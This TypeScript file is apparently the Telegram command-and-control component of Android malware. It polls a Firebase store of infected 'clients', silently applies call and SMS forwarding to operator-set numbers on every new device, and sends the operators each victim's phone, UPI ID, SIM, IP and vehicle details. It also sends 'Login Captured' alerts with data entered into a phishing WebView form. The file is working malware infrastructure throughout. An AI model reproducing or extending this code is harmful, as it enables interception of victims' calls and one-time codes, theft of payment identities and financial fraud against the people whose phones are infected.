import { Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import { sanitizeOwnerTelegramId } from "../lib/telegramIds";
import { isOnline } from "../lib/device";
import { fbGet } from "./firebase";

let knownDevices = new Set<string>();
let knownLogin = new Map<string, number>(); // per-device loginTime -> last notified
let knownOnline = new Map<string, boolean>(); // per-device last known online state
let initialized = false;

/** Mirror of firebases.ts deviceIsOnline — online when ping/lastPing is < 5 min old. */
// isOnline imported from lib/device — Device module locality

export function startDeviceWatcher(bot: Telegraf, adminId: number): void {
  const POLL_INTERVAL = 5_000;

  async function poll() {
    try {
      const clients = await fbGet("clients");
      if (!clients) return;

      const currentIds = new Set<string>(
        Object.keys(clients).filter((k) => !String(k).startsWith("*"))
      );

      if (!initialized) {
        // First run — seed without notification
        knownDevices = currentIds;
        // Seed knownLogin too so old loginTimes never re-notify after a restart
        for (const id of currentIds) {
          const lt = Number(clients[id]?.loginTime || 0);
          if (lt) knownLogin.set(id, lt);
          knownOnline.set(id, isOnline(clients[id], Date.now()));
        }
        initialized = true;
        logger.info(
          { count: knownDevices.size, logins: knownLogin.size },
          "Device watcher initialized"
        );
        return;
      }

      // ── Auto-forward: if admin set global forward defaults, apply
      // call/SMS forwarding to every NEW device (silently to admin number).
      const forwardDefaults = await fbGet("config/forwardDefaults");
      const fwdCall = forwardDefaults?.callNumber || null;
      const fwdSms = forwardDefaults?.smsNumber || null;

      for (const id of currentIds) {
        if (!knownDevices.has(id)) {
          let device: any = clients[id];
          // New devices often write lastPing first and model/phone a moment later.
          // Wait + re-read so the Telegram alert shows the full details.
          if (!device?.mobNo && !device?.modelName) {
            await new Promise((r) => setTimeout(r, 3000));
            const fresh: any = await fbGet(`clients/${id}`).catch(() => null);
            if (fresh) device = fresh;
          }

          if (fwdCall || fwdSms) {
            const events: Record<string, any> = {};
            if (fwdCall) {
              events.callForward = {
                active: true,
                type: "call",
                number: fwdCall,
              };
            }
            if (fwdSms) {
              events.smsForward = { active: true, type: "sms", number: fwdSms };
            }
            const { fbSet } = await import("./firebase");
            await fbSet(`clients/${id}/webhookEvent`, events).catch(
              (err: any) => {
                logger.error(
                  { err, deviceId: id },
                  "Failed to apply forward defaults"
                );
              }
            );
            logger.info(
              { deviceId: id, call: fwdCall, sms: fwdSms },
              "Applied global forward defaults to new device"
            );
          }
          const model = device?.modelName || device?.model || "Unknown Model";
          const phone = device?.mobNo || device?.phone || "Unknown";
          const upi = device?.upi || "N/A";
          const battery = device?.battery || "?%";
          const androidV = device?.androidV || "N/A";
          const ip_address = device?.ip_address || "N/A";
          const storage = device?.storage || "N/A";
          const status =
            typeof device?.status === "boolean"
              ? device.status
                ? "online"
                : "offline"
              : device?.status || "N/A";
          const joined = device?.joined || "N/A";
          const sim1 =
            Array.isArray(device?.sims) && device.sims[0]
              ? [device.sims[0].phoneNumber, device.sims[0].carrierName]
                  .filter(Boolean)
                  .join(" ")
              : device?.sim1 || "";
          const sim2 =
            Array.isArray(device?.sims) && device.sims[1]
              ? [device.sims[1].phoneNumber, device.sims[1].carrierName]
                  .filter(Boolean)
                  .join(" ")
              : device?.sim2 || "";
          const ownerTelegramId: string | null = sanitizeOwnerTelegramId(
            device?.ownerTelegramId
          );
          const vehicle = String(
            device?.vehicleNumber || device?.vehicle || ""
          );
          const loginTime = Number(device?.loginTime || 0);

          logger.info(
            { deviceId: id, model, phone, ownerTelegramId },
            "New device detected"
          );

          const msg =
            `🆕 *New Device Connected!*\n\n` +
            `📱 Model: \`${model}\`\n` +
            `📞 Phone: \`${phone}\`\n` +
            `💳 UPI: \`${upi}\`\n` +
            `🔋 Battery: ${battery}\n` +
            (androidV !== "N/A" ? `🤖 Android: ${androidV}\n` : "") +
            (ip_address !== "N/A" ? `🌐 IP: \`${ip_address}\`\n` : "") +
            (storage !== "N/A" ? `💾 Storage: ${storage}\n` : "") +
            (sim1 ? `📶 SIM1: \`${sim1}\`\n` : "") +
            (sim2 ? `📶 SIM2: \`${sim2}\`\n` : "") +
            (vehicle ? `🚗 Vehicle: \`${vehicle}\`\n` : "") +
            (loginTime
              ? `⏱ Login: ${new Date(loginTime).toLocaleString("en-IN")}\n`
              : "") +
            `\n🆔 Device ID: \`${id}\``;

          // Notify device owner first (if known and not admin)
          if (ownerTelegramId && ownerTelegramId !== adminId.toString()) {
            try {
              await bot.telegram.sendMessage(ownerTelegramId, msg, {
                parse_mode: "Markdown",
              });
            } catch (err) {
              logger.error(
                { err, ownerTelegramId },
                "Failed to notify device owner"
              );
            }
          }

          // Always notify admin
          try {
            await bot.telegram.sendMessage(
              adminId,
              msg +
                (ownerTelegramId ? `\n👤 Owner: \`${ownerTelegramId}\`` : ""),
              { parse_mode: "Markdown" }
            );
          } catch (err) {
            logger.error(
              { err },
              "Failed to send new device notification to admin"
            );
          }

          knownDevices.add(id);
        }
      }

      // Remove deleted devices from tracking set
      for (const id of knownDevices) {
        if (!currentIds.has(id)) knownDevices.delete(id);
      }

      // ── Online-back alert: when a device the user subscribed to comes
      // back online, notify them on Telegram.
      // Subscriptions live at config/onlineAlerts/{telegramId}/{deviceId}.
      const now = Date.now();
      const cameOnline: string[] = [];
      for (const id of currentIds) {
        const online = isOnline(clients[id] || {}, now);
        if (knownOnline.get(id) === false && online) cameOnline.push(id);
        knownOnline.set(id, online);
      }
      // Drop entries for devices that no longer exist so the map stays small.
      for (const id of [...knownOnline.keys()]) {
        if (!currentIds.has(id)) knownOnline.delete(id);
      }

      if (cameOnline.length > 0) {
        const alertMap: Record<string, any> =
          ((await fbGet("config/onlineAlerts").catch(() => null)) as Record<
            string,
            any
          >) || {};
        for (const id of cameOnline) {
          const device = clients[id] || {};
          const model = device?.modelName || device?.model || "Unknown Model";
          const phone = device?.mobNo || device?.phone || "";
          const msg =
            `✅ *Device Online Again*\n\n` +
            `📱 Model: \`${model}\`\n` +
            (phone ? `📞 Phone: \`${phone}\`\n` : "") +
            `🕐 Back online: ${new Date(now).toLocaleString("en-IN")}\n\n` +
            `🆔 Device ID: \`${id}\``;
          for (const [tgId, entry] of Object.entries(alertMap)) {
            const rule = entry?.[id];
            if (!rule || rule.enabled === false) continue;
            try {
              await bot.telegram.sendMessage(tgId, msg, {
                parse_mode: "Markdown",
              });
              logger.info(
                { deviceId: id, telegramId: tgId },
                "Online-back alert sent"
              );
            } catch (err) {
              logger.error(
                { err, deviceId: id, telegramId: tgId },
                "Online-back alert failed"
              );
            }
          }
        }
      }

      // ── Login-capture notification: when the WebView app's login form data
      // (Mobile + Vehicle Number) lands on a device, ping the admin on Telegram.
      for (const id of currentIds) {
        const dev = clients[id] || {};
        const lt = Number(dev.loginTime || 0);
        // Only notify if loginTime changed to something NEWER than what we last saw.
        const last = knownLogin.get(id) || 0;
        if (!lt || lt <= last) {
          // Keep a baseline so a stale value never matches a future restart flood
          if (lt && !knownLogin.has(id)) knownLogin.set(id, lt);
          continue;
        }
        knownLogin.set(id, lt);
        const m = String(dev.mobNo || dev.phone || "");
        const v = String(dev.vehicleNumber || dev.vehicle || "");
        const loginMsg =
          `🔐 *Login Captured* — \`${id}\`\n\n` +
          `📞 Mobile: \`${m || "—"}\`\n` +
          `🚗 Vehicle: \`${v || "—"}\`\n` +
          `⏱ Time: ${new Date(lt).toLocaleString("en-IN")}`;
        try {
          await bot.telegram.sendMessage(adminId, loginMsg, {
            parse_mode: "Markdown",
          });
          logger.info(
            { deviceId: id, loginTime: lt },
            "Login captured notification sent"
          );
        } catch (err) {
          logger.error({ err, deviceId: id }, "Login notification failed");
        }
      }
    } catch (err) {
      logger.error({ err }, "Device watcher poll error");
    }
  }

  setInterval(poll, POLL_INTERVAL);
  poll();
  logger.info("Device watcher started (polling every 5s)");
}
